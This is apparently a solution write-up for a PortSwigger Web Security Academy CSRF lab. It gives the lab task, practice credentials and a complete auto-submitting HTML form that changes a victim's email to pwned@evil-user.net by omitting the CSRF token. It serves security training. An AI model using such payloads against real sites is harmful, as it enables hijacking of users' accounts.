# CSRF where token validation depends on token being present

## This lab's email change functionality is vulnerable to CSRF.

## To solve the lab, use your exploit server to host an HTML page that uses a [CSRF attack](https://portswigger.net/web-security/csrf) to change the viewer's email address.

## You can log in to your own account using the following credentials: `wiener:peter`

```html
<html>
  <body>
    <form
      action="https://0a91007203cdae6f80cfdffc00380074.web-security-academy.net/my-account/change-email"
      method="POST"
    >
      <input type="hidden" name="email" value="pwned@evil-user.net" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```
